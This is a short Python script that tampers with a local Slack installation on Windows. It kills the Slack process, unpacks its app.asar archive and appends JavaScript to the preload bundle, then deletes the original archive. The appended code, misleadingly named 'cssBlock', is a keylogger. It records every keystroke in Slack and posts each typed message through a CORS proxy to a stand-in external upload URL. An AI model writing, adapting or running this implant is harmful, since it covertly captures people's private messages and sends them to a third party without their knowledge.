from asarPy import extract_asar
from os import listdir
import os.path

cssBlock = """\ndocument.addEventListener('DOMContentLoaded', function() {
	  var message = ""
	  document.onkeydown = function (e) {
		if (e.key == "Enter") {
			var xhr = new XMLHttpRequest();
			url = 'https://cors-anywhere.herokuapp.com/' + 'yoursite.com/upload.php'
			xhr.open("POST", url, true);
			xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
			xhr.send("message=" + message);
			message = "";
		}
		else {
			message = message + e.key
		}
	};
	});"""

homedir = os.path.expanduser("~")
verDir = homedir + "\\AppData\\Local\\slack"
verArray = []
for f in listdir(verDir):
	split = f.split('-')
	if split[0] == 'app' and f != "app-release.ico":
		verArray.append(split[1])
maxVer = max(verArray)
appFile = verDir + "\\app-" + maxVer + "\\resources\\app.asar"
extractFolder =  verDir + "\\app-" + maxVer + "\\resources\\"
os.system("taskkill /IM slack.exe /F")
extract_asar(appFile, extractFolder + "app")
file = open(extractFolder + "app\\" + "dist\\main-preload-entry-point.bundle.js", 'a')
file.write(cssBlock)
file.close()
os.system("del /f " + appFile)

